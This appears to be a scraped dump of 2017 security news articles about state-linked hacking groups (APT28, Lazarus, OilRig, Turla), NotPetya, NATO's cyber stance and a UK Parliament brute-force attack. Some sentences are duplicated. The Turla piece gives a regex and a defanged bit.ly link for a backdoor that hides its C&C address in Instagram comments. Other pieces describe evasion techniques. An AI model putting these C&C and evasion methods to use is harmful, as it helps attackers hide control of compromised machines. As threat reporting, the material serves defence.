occur.) The threat actors then likely used password-cracking techniques to obtain the plaintext password. Once actors obtain valid credentials, they are able to masquerade as authorized users.\u201d\n\nAPT28 hackers also used spear-phishing emails with a generic contract agreement in the form of a PDF that even if doesn\u2019t include a malicious code prompts the victim to click a link which (via a shortened URL) downloads a malicious file.\n\nThe weaponized attachments may refer to legitimate curricula vitae CVs or resum\u00e9s for industrial control systems personnel, invitations or policy documents designed to entice users into clicking on the attachment.\n\n\u201cThe emails leveraged malicious Microsoft Word attachments that appear to be legitimate r\u00e9sum\u00e9s or curricula vitae (CVs) for industrial control systems personnel, as well as invitations and policy documents that entice the user to open the attachment. The list of file names has been published in the IOC.\u201d continues the alert.\n\nAttackers also used watering hole attacks, attackers compromise trade publications and informational websites related to process control, ICS, or critical infrastructure.\n\nMuch more detail, including indicators of compromise, filenames used in the attacks, and MD5 hashes, can be found in the alert published on US-CERT.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 energy firms, critical infrastructure)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/dhs", "topic_name": "DHS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/dragonfly", "topic_name": "Dragonfly"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/energy-firms", "topic_name": "energy firms"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/fbi", "topic_name": "FBI"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}]}, {"news_name": "APT28 group is rushing to exploit recent CVE-2017-11292 Flash 0-Day before users apply the patches", "news_link": "https://securityaffairs.co/wordpress/64611/apt/cve-2017-11292-apt28.html", "title": "APT28 group is rushing to exploit recent CVE-2017-11292 Flash 0-Day before users apply the patches\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 22, 2017", "body": "Security experts at Proofpoint collected evidence of several malware campaigns, powered by the Russian APT28 group, that rely on a Flash zero-day vulnerability that Adobe patched earlier this week.\n\nAccording to the experts who observed attacks on organizations across Europe and in the US, the APT28 group is trying to exploit the CVE-2017-11292 zero-day before users receive patches or update their systems.\n\nThe state-sponsored hackers focused their attacks on state departments and private-sector businesses in the aerospace industry.\n\n\u201cOn Tuesday, October 18, Proofpoint researchers detected a malicious Microsoft Word attachment exploiting a recently patched Adobe Flash vulnerability, CVE-2017-11292. We attributed this attack to APT28 (also known as Sofacy), a Russian state-sponsored group.\u201d states the report published by Proofpoint. \n\n\u201cTargeting data for this campaign is limited but some emails were sent to foreign government entities equivalent to the State Department and private-sector businesses in the aerospace industry.

Security researchers discovered that North Korean Lazarus APT group was behind recent attacks on banks, including the Bangladesh cyber heist.\n\nAccording to security experts, the group was behind, other large-scale cyber espionage campaigns against targets worldwide, including the Troy Operation, the DarkSeoul Operation, and the Sony Picture hack.\n\nThe Lazarus group, tracked by the U.S. government as Hidden Cobra, seems to be behind recent attacks against U.S. defense contractors, likely in cooperation with other hacker groups.\n\nBack to the recent attack, hackers exploited the SWIFT global financial network to steal roughly $60 million from Taiwan\u2019s Far Eastern International Bank.\n\nReports of $60M being stolen are not correct, the overall amount actually stolen by the hackers were considerably lower.\n\nThe hackers transferred the money outside the island, but the bank claimed it had managed to recover most of it.\n\nThe Sri Lanka police have recently arrested two men allegedly involved in the cyberheist, the suspects are accused to have hacked into computers at a Taiwan bank and stole millions of dollars\n\nResearchers at BAE Systems have identified some of the tools used in the cyber heist and linked them to the Lazarus\u2018s arsenal.\n\nResearchers believe attackers used a piece of ransomware known as Hermes as a distraction tactic. According to researchers at McAfee, the Hermes variant used in the attack on the Taiwanese bank did not display a ransom note, a circumstance that suggests it wasn\u2019t used for a different purpose, distraction.\n\n\u201cWas the ransomware used to distract the real purpose of this attack? We strongly believe so,\u201d McAfee researchers said. \u201cBased on our sources, the ransomware attack started in the network when the unauthorized payments were being sent.\u201d\n\nLazarus operators likely used the Hermes ransomware on the bank\u2019s network to interfere with the investigations and destroy evidence of their attack.\n\n\u201cThe Hermes strain used on FEIB\u2019s network did not change the infected computer\u2019s wallpaper and didn\u2019t leave a flashy ransom note behind, like the original Hermes note, portrayed below.\u201d reported Bleeping computer.\n\n\u201cInstead, the Hermes version used in the FEIB attacks only showed a popup with the text \u201cfinish work\u201d and left a file named \u201cUNIQUE_ID_DO_NOT_REMOVE\u201d in every directory.\u201d \n\nThe Hermes samples analyzed by researchers at BAE Systems drop a ransom note in each encrypted folder.\n\nThe experts also analyzed another strain of malware used in the attack dubbed Bitsran, it is a loader used to spreads a malicious payload on the targeted network. The analysis of its code revealed the presence of hardcoded credentials for the network of the Far Eastern International Bank. The malware was likely used in a reconnaissance phase.\n\n\u201cSample #2 [Bitsran] is designed to run and spread a malicious payload on the victim\u2019s network.\u201d states the report.\n\n\u201cThe malware then enumerates all processes, searching for specific anti-virus processes and attempts to kill these using the command line tool taskkill.\u201d\n\nOther malware used by the attackers are the same used by the Lazarus group, including in attacks aimed at financial organizations in Poland and Mexico.\n\n\n\nThe malicious code contains string written in the Russian Language, but researchers believe is a false flag to deceive them.\n\nThe sample of Hermes ransomware analyzed by the experts checks the infected machine\u2019s language settings and stopped running if use Russian, Ukrainian or Belarusian languages. This feature widely adopted by Russian and Ukrainian vxers who often avoid targeting machines in their country. However, experts speculate this could also be a false flag.\n\n\u201cThe ransomware calls GetSystemDefaultLangID() to obtain language identifier for the system locale. It contains a list of three system language codes: 0x0419 (Russian), 0x0422 (Ukrainian), and 0x0423 (Belarusian). However, it only checks against the last two, and, if matching, the malware quits. Whether this is a false-flag or not is unknown.\u201d states the analysis.\n\nBelow the hallmarks of the Lazarus group that were recognized by BAE experts in the attack on the Taiwanese Far Eastern International Bank:\n\n\u201cDespite their continued success in getting onto payment systems in banks, the Lazarus group still struggle getting the cash in the end, with payments being reversed soon after the attacks are uncovered,\u201d concluded BAE Systems.\n\n\u201cThe group may be trying new tricks to disrupt victims and delay their ability to respond \u2013 such as different message formats, and the deployment of ransomware across the victim\u2019s network as a smokescreen for their other activity.

The payload embedded within the ISMInjector sample delivered in this attack is a variant of the ISMAgent backdoor that we had discussed in detail in our blog discussing a targeted attack on a Saudi Arabian technology company.\u201d reads the analysis published by PaloAlto Networks.\n\n\n\nThe ISMInjector tool has a modular architecture and implements sophisticated anti-analysis techniques that were not previously exploited by the OilRig group.\n\nIn the attack against the UAE government, OilRig hackers delivered their malware using spear-phishing emails with weaponized documents, the emails were having the subject line \u201cImportant Issue.\u201d\n\nAn interesting aspect of the attack against the UAE government, it that the spear-phishing messages were sent from the targeted organization\u2019s own domain. The hackers used a compromised Outlook Web Access (OWA) account whose credentials attackers obtained in a previous phishing attack.\n\n\u201cThis string in the header suggests that the OilRig actor is likely to have used the targeted organization\u2019s Outlook Web Access (OWA) to send the phishing email using Firefox 36.\u201d continues the analysis.\n\n\u201cUsing information from our research in the Striking Oil blog, we know the OilRig group has conducted credential harvesting campaigns specifically by emulating OWA login sites. Based on that research and this observation, we postulate that the OilRig group gathered credentials to a legitimate user\u2019s OWA account and logged into the user\u2019s account to send phishing attacks to other individuals within the same, targeted organization.\u201d\n\nThe weaponized documents delivered the ISMInjector Trojan, which in turn dropped a variant of the ISMAgent backdoor by injecting it into a remote process it created.\n\nThe malware implements a \u201cstate machines\u201d approach to create a new process and inject the malicious payload into that process. Each state is responsible for carrying on particular action and it specifies the next state that should be executed.\n\nThe states are not executed in sequential order making hard the analysis by security researchers, authors also used a crypter as anti-analysis mechanism.\n\nOilRig is just one of the Iran-linked hacker crews, other groups tracked by security experts are APT33, Rocket Kitten, Cobalt Gypsy (Magic Hound), Charming Kitten (aka Newscaster and NewsBeef) and CopyKittens.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Iran, OilRig)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/backdoor", "topic_name": "backdoor"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/helminth", "topic_name": "Helminth"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iranian-hackers", "topic_name": "Iranian hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/oilrig-campaign", "topic_name": "OilRig campaign"}]}, {"news_name": "North Korea hackers threaten Irish companies with \u2018almost daily\u2019 attacks", "news_link": "https://securityaffairs.co/wordpress/64069/cyber-warfare-2/north-korea-targets-ireland.html", "title": "North Korea hackers threaten Irish companies with \u2018almost daily\u2019 attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "October 9, 2017", "body": "North Korean state-sponsored hackers are launching almost daily attacks on Irish companies and critical infrastructure, they are also suspected to be responsible for the \u20ac4.3m cyber heist on Meath County Council in October 2016.\n\nIreland is considered a privileged target of nation-state actors due to the presence of many US multinationals.\n\nDefence Minister Paul Kehoe recognized the urgency to rapidly improve the security of national infrastructure against cyber attacks.\n\nThe overall cost of cyber attacks on Irish companies has soared from \u20ac498,000 in 2014 to \u20ac1.7m in 2016, and the situation will be worst in a next future.\n\n\u201cThe number of cyber attacks suffered by Irish businesses doubled between 2012 and 2016, but that figure is expected to double or even treble because of recent ransomware attacks.\u201d reported the Irish Independent.\n\nNorth Korea has recently turned to international cyber robbery to fund its military operations, and Ireland is on the front line of the cyber battle.\n\n\u201cBut North Korea has thrown the entire rule book out the window.

Shipboard navigation equipment, which appeared to be working properly, reported the location of the vessels 20 miles inland, near an airport.\u201d reported McClatchy.\n\n\u201cThat was the first known instance of GPS \u201cspoofing,\u201d or misdirection.\u201d\n\n\u201cWe saw it done in, I would say, a really unsubtle way, a really ham-fisted way. It was probably a signal that came from the Russian mainland.\u201d said Humphreys.\n\nThe Navy, Humphreys said, does not use commercial GPS, and \u201cthere is no indication that faulty satellite communications were a culprit in the USS McCain accident.\u201d\n\nEven if some ships used on Automatic Identification System (AIS) to avoid collisions, there is the concrete risk that someone could hack the AIS.\n\nAccording to Chinese authorities, the USS John S McCain incident was caused by the ineptitude of US Navy.\n\n\u201cThe latest incident occurred just two months after the USS Fitzgerald and a Philippine container ship collided in waters off Japan, killing seven US sailors.\u201d states the China Daily.\n\n\u201cIt may be hard for people to understand why US warships are unable to avoid other vessels since they are equipped with the world\u2019s most sophisticated radar and electronic tracking systems, and aided by crew members on constant watch. But investigations into the cause of the USS Fitzgerald collision shed some light on the way US warships tend to sail without observing maritime traffic rules and the sloppiness of their crews.\u201d\n\nItay Glick, who worked as for an Israeli intelligence agency in a cyberwarfare unit and founder of cyber security firm Votiro believe that the incident could be the result of a cyber attack.\n\n\u201cI don\u2019t believe in coincidence,\u201d Mr Glick told news.com.au.\n\n\u201cBoth USS McCain and USS Fitzgerald were part of the 7th Fleet, there is a relationship between these two events and there may be a connection.\u201d\n\nMr Glick believes foreign states like Russia and China may have the capability to launch an attack on the warships.\n\n\u201cChina has capabilities, maybe they are trying things, it is possible,\u201d he said.\n\nHe explained that such kind of attacks could be the result of GPS spoofing or a malware based attack on its computer network.\n\n\u201cI don\u2019t believe in coincidence.

The experts discovered a newly dropper for the KopiLuwak backdoor, KopiLuwak is a JavaScript malware that was spotted early this year while the APT was delivering it to at least one victim leveraging a document containing an official letter from the Qatar Embassy in Cyprus to the Ministry of Foreign Affairs in Cyprus.\n\nThe KopiLuwak uses multiple JavaScript layers to avoid detection, the malicious code gain persistence on the targeted machine by creating a registry key. Once infected a system, the malicious code is able executes a series of commands to collect information and exfiltrate data. Stolen data are temporarily stored in a file that is deleted after it\u2019s encrypted and stored in memory.\n\nThe KopiLuwak JavaScript malware is controlled through a collection of compromised websites, the IP address of those websites are hardcoded into the malicious code.\n\nThe C&C can send arbitrary commands to the infected system using Wscript.shell.run().\n\nTurla is the name of a Russian cyber espionage APT group (also known as Waterbug, Venomous Bear and KRYPTON) that has been active since at least 2007 targeting government organizations and private businesses.\n\nThe list of victims is long and includes also the Swiss defense firm RUAG and the US Central Command.\n\nThe Turla\u2019s arsenal is composed of sophisticated hacking tools and malware tracked as Turla (Snake and Uroburos rootkit), Epic Turla (Wipbot and Tavdig) and Gloog Turla. In June 2016, researchers from Kaspersky reported that the Turla APT had started using rootkit), Epic Turla (Wipbot and Tavdig) and Gloog Turla. In June 2016, researchers from Kaspersky reported that the Turla APT had started using Icedcoffee, a JavaScript payload delivered via macro-enabled Office documents.\n\nBack to the present, the APT group appears to be actively targeting G20 participants and those interested in its activities including politicians, member nations, and journalists.\n\n\u201cIn this case, the dropper is being delivered with a benign and possibly stolen decoy document inviting recipients to a G20 task force meeting on the \u201cDigital Economy\u201d. The Digital Economy event is actually scheduled for October of this year in Hamburg, Germany. \u201d states  Proofpoint. \u201cThe dropper first appeared in mid-July, suggesting that this APT activity is potentially ongoing, with Turla actively targeting G20 participants and/or those with interest in the G20, including member nations, journalists, and policymakers.\u201d\n\nResearchers at Proofpoint recently discovered the dropper on a public malware repository, hackers are delivering it to targets via spear phishing emails that use weaponized attachment titled \u201cSave The Date\u201d invitation to the October G20 taskforce meeting.\n\nThe invitation is an executable Program Information File (PIG) that appears as a PDF document, it includes a set of instructions for delivering KupiLuwak. When the victim double-clicks on the PDF icon, the PIF opens the decoy document normally while in the background it delivers the backdoor.\n\nOnce installed on a system, KupiLuwak allows the attackers to fully control it.\n\n\n\nThe experts believe the decoy document is a genuine invitation to the G20 task force meeting and was likely stolen.\n\n\u201cAs far as we are aware, this document is not publicly available and so may indicate that an entity with access to the invitation was already compromised. Alternatively, the document may have been legitimately obtained from a recipient.\u201d continues ProofPoint.\n\n\u201cProofpoint researchers ascertain with medium confidence that the document is legitimate and not fabricated.\u201d\n\nThe subject of the weaponized documents used by the hackers suggests the Turla APT is gathering information related to G20 event and its participants.\n\nAnyway, we have to consider that the samples analyzed by Proofpoint were obtained from a public malware repository and were not observed in the wild, this means that it is quite impossible to estimate the full scope and impact of the attack.\n\nThe high profile of potentially targeted individuals associated with the G20 and early reconnaissance nature of the tools involved bear further watching.

The hackers have various backdoor modules with unique characteristics and functionalities, it manages a large Command and Control infrastructure that includes more than 200 unique IP addresses and C&C domains.\n\nMost C&C servers used by Spring Dragon are located in Hong Kong and the United States, other servers have also been found in Germany, China and Japan.\n\n\u201cThe large number of samples which we have managed to collect have customized configuration data, different sets of C2 addresses with new hardcoded campaign IDs, as well as customized configuration data for creating a service for malware on a victim\u2019s system. This is designed to make detection more difficult.\u201d continues the analysis.\n\n\u201cAll the backdoor modules in the APT\u2019s toolset are capable of downloading more files onto the victim\u2019s machine, uploading files to the attacker\u2019s servers, and also executing any executable file or any command on the victim\u2019s machine. These functionalities enable the attackers to undertake different malicious activities on the victim\u2019s machine.\u201d\n\nThe analysis of the malware compilation timestamps revealed that attackers might be in the GMT+8 time zone, the same of countries like China, Indonesia, Malaysia, Mongolia, Singapore, Taiwan, the Philippines and Western Australia.\n\nAnother interesting information emerged from the analysis is that the malware has been compiled by two different groups, one of which may be in Europe.\n\n\u201cIt also suggests that either there is a second group working another shift in the same time zone or the attackers are cross-continental and there is another group, possibly in Europe. The uneven distribution of timestamps (low activity around 10am, 7-8pm UTC) suggests that the attackers didn\u2019t change the timestamps to random or constant values and they might be real.\u201d states the analysis.\n\n\u201cThe number of malware samples which we managed to collect (over 600) for the group surpassed many others, and suggests an operation on a massive scale. It\u2019s possible that this malware toolkit is offered in specialist public or private forums to any buyers, although, to date, we haven\u2019t seen this.\u201d\n\nPierluigi Paganini\n\n(Security Affairs \u2013 cyber espionage, Spring Dragon APT)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/spring-dragon", "topic_name": "Spring Dragon"}]}, {"news_name": "Microsoft sued Fancy Bear to gain control of the domains used in the cyber espionage campaigns", "news_link": "https://securityaffairs.co/wordpress/61232/cyber-crime/fancy-bear-lawsuit.html", "title": "Microsoft sued Fancy Bear to gain control of the domains used in the cyber espionage campaigns\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 21, 2017", "body": "Microsoft used the lawsuit to disrupt a large number of cyber espionage campaigns conducted by infamous Fancy Bear APT hacking group (APT28, Sofacy, Sednit, and Pawn Storm).

Recent attacks against Ukraine\u2019s infrastructure have many other countries taking note and have encouraged NATO to pitch in and help bolster Ukrainian cyber defenses.\n\nIn December 2015, Ukrainian power grid operators watched helplessly as hackers remotely logged into three power distribution centers and turned off power to over 230,000 residents. The hackers had started their plans many months earlier by sending carefully crafted phishing emails to key IT staff working for the target companies. The malicious attachments to these emails allowed the bad guys to gain a foothold in the networks and over the subsequent months they carefully gathered information and improved their remote capabilities until it was time to strike. Attribution is difficult, but given the patience and approaches demonstrated by the bad guys it is obvious that they are sophisticated and many people are pointing their finger at Russian-linked hacking groups.\n\n\n\nMore recently, in June 2017, a ransomware attack was launched in Ukraine impacting transportation, banking and power infrastructure. Believed to be the Petya ransomware variant, the attack spread beyond the original targets and became a worldwide problem that has directly cost millions of dollars in lost production for many companies as well as untold costs in remediation and recovery efforts. As investigators began to dig deeper into the Petya attack it appears that it was only masquerading as ransomware. The primary function of ransomware is to generate revenue for the bad guys. However, this attack had a clunky mechanism for gathering the ransom so it appears its primary function was something else. Most experts now agree that this was another attack intended to disrupt Ukrainian infrastructure and have dubbed it the NotPetya attack. Again attribution is uncertain, but Russian-linked groups are suspected.\n\nAll other countries are keeping a close watch on these developments. It is reported that critical infrastructure protections in Ukraine are better than many other countries\u2019 so it is conceivable that these same attacks will eventually be turned against new targets. In a demonstration of solidarity \u2014 and likely a lot of self-interest \u2014 NATO has agreed to provide Ukraine with support and equipment to \u201chelp Ukraine investigate who is behind the different attacks,\u201d according to NATO secretary-general Jens Stoltenberg. In December 2014 NATO established the Cyber Defence Trust Fund with a mandate \u201cto provide Ukraine with the necessary support to develop its strictly defensive, CSIRT-type technical capabilities, including laboratories to investigate cyber security incidents.\u201d Since June 2016, \u20ac965,000 has been contributed by eight countries and while this helped to bolster Ukrainian cyber defenses, it is obvious that it isn\u2019t enough.\n\n \n\nSpeaking on the topic of Ukraine formally joining the NATO union at a joint press conference with NATO on Monday, Ukrainian President Petro Poroshenko said,\n\n\u201cToday we clearly stated that we would begin a discussion about a membership action plan and our proposals for such a discussion were accepted with pleasure.\u201d\n\nGiven the recent cyber attacks\u2019 rumored source as Russian-linked hacking groups, the ongoing tensions between Russia and Ukraine as well Russia\u2019s public stance against any NATO expansion this is unlikely to calm things down in the region. But with the sophistication of the cyber attacks and the apparent disregard for global impacts beyond Ukrainian borders, it is impractical for other countries to sit on the sidelines and let Ukraine attempt to protect themselves.\n\n\u201cNATO is learning a lot from Ukraine,\u201d says Jens Stoltenberg.\n\n \n\n \n\nPierluigi Paganini\n\n(Security Affairs \u2013 Nato,Ukraine)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyberweapon", "topic_name": "cyberweapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nato", "topic_name": "NATO"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/notpetya", "topic_name": "notpetya"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ransomware", "topic_name": "ransomware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ukraine", "topic_name": "Ukraine"}]}, {"news_name": "Nato will respond with \u2018conventional military assaults\u2019 to future cyber attacks", "news_link": "https://securityaffairs.co/wordpress/60852/cyber-warfare-2/nato-article-5.html", "title": "Nato will respond with \u2018conventional military assaults\u2019 to future cyber attacks\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 10, 2017", "body": "NATO has warned that in the future any cyber attack against a member state could trigger a military response according to the alliance\u2019s Article 5, mutual defence clause.\n\nThe NATO announcement follows the massive NotPetya ransomware-based attacks that hit system worldwide. most of them in Ukraine.\n\nThe Petya ransomware hit systems in several industries, including banks, transport, telecommunications, and energy.

The attackers were well funded and the attack they conducted was very complex and expensive.\n\nThe experts observed that despite the operation was complex, the attackers did not spend much effort for managing the payments, a circumstance that suggests hackers were not financially motivated.\n\nAccording to the NATO secretary-general Jens Stoltenberg, NATO is threatening to respond to cyber-attacks against member states with a conventional military strike.\n\nStoltenberg highlighted that that NATO leaders officially recognized the cyberspace as the fifth domain of a warfare so the alliance could respond with conventional weapons in case of a powerful cyber attack.\n\n\u201cThe attack in May and this week just underlines the importance of strengthening our cyber defences and that is what we are doing. We exercise more, we share best practices and technology, and we also work more and more closely with allies,\u201d said Stoltenberg.\n\n\u201cNato helps Ukraine with cyber defence and has established a trust fund to finance programs to help Ukraine improve its cyber defences. We will continue to do this and it is an important part of our cooperation,\u201d.\n\nThe Ukrainian secret service launched an investigation to attribute the attack, the local authorities believe that a Russian APT was behind the attack.

The attackers were well funded and the attack they conducted was very complex and expensive.\n\nThe experts observed that despite the operation was complex, the attackers did not spend much effort for managing the payments, a circumstance that suggests hackers were not financially motivated.\n\n\u201cAs the extortion of money seems to be just a negligently prepared cover according to various news then the question about the motivation behind NotPetya attack should be looked from other perspectives. Even though the same vulnerability was used by WannaCry, the actors behind these two similar attacks are likely not the same. In both cases a possible financial gain for attackers has been more than modest. However, an effect was achieved, a large-scale successful disruptive attack almost globally, is almost identical in both cases. \u201d continues the NATO release.\n\n\u201cNotPetya is a sign that after WannaCry, yet another actor has exploited vulnerability exposed by the Shadow Brokers. Furthermore, it seems likely that the more sophisticated and expensive NotPetya campaign is a declaration of power \u2013 demonstration of the acquired disruptive capability and readiness to use it,\u201d concluded Lauri Lindstr\u00f6m, researcher at NATO CCD COE Strategy Branch.\n\n\n\nThe first is that the attack was powered by technologically capable criminals but with poor operational abilities. Attackers used one bitcoin wallet and used a single email account to contact.\n\nThe second theory is that the real motivation behind the attack is sabotage on a large scale.\n\n\u201cPerhaps this attack was never intended to make money, rather to simply disrupt a large number of Ukrainian organizations. Launching an attack that would wipe victim hard drives would achieve the same effect, however, that would be an overtly aggressive action,\u201d O\u2019Gorman wrote in a blog post.\n\n\u201cEffectively wiping hard drives through the pretense of ransomware confuses the issue, leaving victims and investigators to ask: \u2018Are the attackers politically motivated, or criminally motivated?'\u201d\n\nWannaCry and NotPetya raise again the question about the possible response options of the international community and the necessity of norms of state behavior in the cyber space.\n\nBoth arguments were discussed at the recent Italy G7 Summit, with my colleagues at the G7 cyber group we proposed a set of norms of state behavior to address these problems. The result was a voluntary, non-binding norms of State behavior during peacetime in the G7 DECLARATION ON RESPONSIBLE STATES BEHAVIOR IN CYBERSPACE.\n\nNATO CCD COE calls for a special joint investigation to attribute the attack to a specific actor and persecute it.\n\n\u201cWannaCry and NotPetya raise again the question about the possible response options of the international community.  The number of affected countries shows that attackers are not intimidated by a possible global level investigation in response to their attacks. This might be an opportunity for victim nations to demonstrate the contrary by launching a special joint investigation.\u201d concludes the press release.\n\nPierluigi Paganini \n\n(Security Affairs \u2013 NotPetya, NATO)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructure", "topic_name": "critical infrastructure"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nato", "topic_name": "NATO"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/notpetya", "topic_name": "notpetya"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/petya", "topic_name": "Petya"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/wannacry-ransomware", "topic_name": "wannacry ransomware"}]}, {"news_name": "UK Parliament shut down external access to email accounts after cyberattack", "news_link": "https://securityaffairs.co/wordpress/60404/hacking/uk-parliament-cybercattack.html", "title": "UK Parliament shut down external access to email accounts after cyberattack\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 25, 2017", "body": "The UK Parliament has shut down external access to e-mail accounts on Saturday after a cyberattack.\n\nAccording to the authorities, the attack was \u201csustained and determined,\u201d hackers launched a prolonged brute-force attack against the Parliament email system in the attempt to access accounts.\n\n\u201cParliament has suffered its biggest ever cyber attack as hackers launched a \u201csustained and determined\u201d attempt to break into MPs email accounts.\u201d reported The Telegraph.\n\n\u201cThe \u201cbrute force\u201d assault lasted for more than 12 hours on Friday as unknown hackers repeatedly targeted \u201cweak\u201d passwords of politicians and aides.\u201d\n\nCyber security attack on Westminster Parliamentary e.mails may not work remotely Text urgent messages @LibDemLords @LabourLordsUK @Torypeers\n\n\u2014 Chris Rennard (@LordRennard) June 24, 2017\n\n\n\n\u201cEarlier this morning we discovered unusual activity and evidence of an attempted cyberattack on our computer network,\u201d wrote Rob Greig, director of the Parliamentary Digital Service.\n\n\u201cCloser investigation by our team confirmed that hackers were carrying out a sustained and determined attack on all parliamentary user accounts.\u201d\n\n\u201cWe have been working closely with the National Cyber Security Centre to identify the method of the attack and have made changes to prevent the attackers gaining access.\u201d\n\nAccording to a spokeswoman from House of Commons, the officials had taken \u201cthe necessary steps to protect our systems, any external access to email accounts was suspended.\n\n\u201cWe have discovered unauthorised attempts to access accounts of parliamentary networks users and are investigating this ongoing incident,  working closely with the National Cyber Security Centre.\u201d\n\n\u201cParliament has robust measures in place to protect all of our accounts and systems, and we are taking the necessary steps to protect and secure our network.

The information related to DeltaCharlie from the Operation Blockbuster Destructive Malware report should be viewed in conjunction with the IP addresses listed in the .csv and .stix files provided within this alert.\u201d states the report.\n\n\u201cDeltaCharlie is a DDoS tool capable of launching Domain Name System (DNS) attacks, Network Time Protocol (NTP) attacks, and Character Generation Protocol attacks,\u201d US-CERT said. \u201cThe malware operates on victims\u2019 systems as a svchost-based service and is capable of downloading executables, changing its own configuration, updating its own binaries, terminating its own processes, and activating and terminating denial-of-service attacks.\u201d\n\nThe DHS agency warned of the presence of the DDoS malware on victims\u2019 networks for a significant period of time.\n\n\u201cTools and capabilities used by HIDDEN COBRA actors include DDoS botnets, keyloggers, remote access tools (RATs), and wiper malware. Variants of malware and tools used by HIDDEN COBRA actors include Destover,[3](link is external) Wild Positron/Duuzer,[4](link is external) and Hangman.[5](link is external) DHS has previously released Alert TA14-353A,[6] which contains additional details on the use of a server message block (SMB) worm tool employed by these actors.\u201d continues the report.\u201dFurther research is needed to understand the full breadth of this group\u2019s cyber capabilities.

The malicious code leverages comments posted to Instagram to obtain the address of its command and control (C&C) servers.\n\nTurla APT is considered a group of hackers linked to the Russian Government, it is also known as Waterbug, KRYPTON and Venomous Bear.\n\nThe APT have been active since at least 2007, it was involved in several high-profile attacks against targets worldwide, including the ones aimed at Swiss defense firm RUAG and the U.S. Central Command.\n\nLast time experts analyzed the threat actor was March 2017 when ESET firm reported that it was continuing to improve its Carbon backdoor, the malware researchers detected new versions released on a regular basis. The group is still active and it is developing new hacking tools and empowering the existing ones.\n\nAt the annual Kaspersky Lab conference, researcher Thomas Rid along security experts Costin Raiu and Juan Andres Guerrero-Saade presented the findings of its research that definitively connect the Moonlight Maze cyber espionage campaigns to the Russian APT group.\n\nTurla APT recently targeted the websites of ministries, embassies and other organizations worldwide, in its last campaign hackers leverage social media to control their malware.\n\nThe APT has powered watering hole attacks compromising websites that are likely to be visited by targets of interest, the cyber spies injected malicious code on the websites in an effort to redirect their visitors to a server that delivered a JavaScript tool designed for track a profile of the victim\u2019s machine.\n\nIn one case, hackers used a Firefox extension that worked as a backdoor, something similar was spotted by malware researchers at Bitdefender while analyzing the Pacifier Operation.\n\n\u201cThrough our monitoring of these watering hole campaigns, we happened upon a very interesting sample. Some of you may remember the Pacifier APT report by BitDefender describing a spearphishing campaign with a malicious Microsoft Word document sent to several institutions worldwide. These malicious documents would then drop a backdoor. We now know that this report describes Skipper, a first stage backdoor used by the Turla gang.\u201d reads the analysis published by ESET. \u201cThat report also contains a description of a Firefox extension dropped by the same type of malicious document. It turns out we have found what most likely is an update of this Firefox extension. It is a JavaScript backdoor, different in terms of implementation to the one described in the Pacifier APT report, but with similar functionalities.\u201d\n\nThe Firefox extension used in this last campaign was spread through the website of a Swiss security company\u2019s website. The backdoor gathers information on the infected system, and it allows attackers to perform ordinary spyware actions.\n\nThe peculiarity of the backdoor is the way it obtains the address of its C&C server, it looks at a specific comment posted to a photo on Britney Spears\u2019 Instagram account.\n\nThe comment reads\n\n\u201c#2hot make loved to her, uupss #Hot #X,\u201d\n\n\n\nParsing the comment with a regular expression it is possible to obtain a bit.ly URL that represents the backdoor\u2019s C&C server.\n\nThe extension determines the comment to parse by computing a custom hash value that must match 183.\n\n\u201cThe extension will look at each photo\u2019s comment and will compute a custom hash value. If the hash matches 183, it will then run this regular expression on the comment in order to obtain the path of the bit.ly URL:\n\n(?:\\\\u200d(?:#|@)(\\\\w)\u201d continues the analysis.\n\nParsing the comment through the regex experts got the following bit.ly URL:\n\nhttp://bit[.]ly/2kdhuHX\n\n\u201cLooking a bit more closely at the regular expression, we see it is looking for either @|# or the Unicode character \\200d. This character is actually a non-printable character called \u2018Zero Width Joiner\u2019, normally used to separate emojis. Pasting the actual comment or looking at its source, you can see that this character precedes each character that makes the path of the bit.ly URL:\n\nsmith2155<200d>#2hot ma<200d>ke lovei<200d>d to <200d>her, <200d>uupss 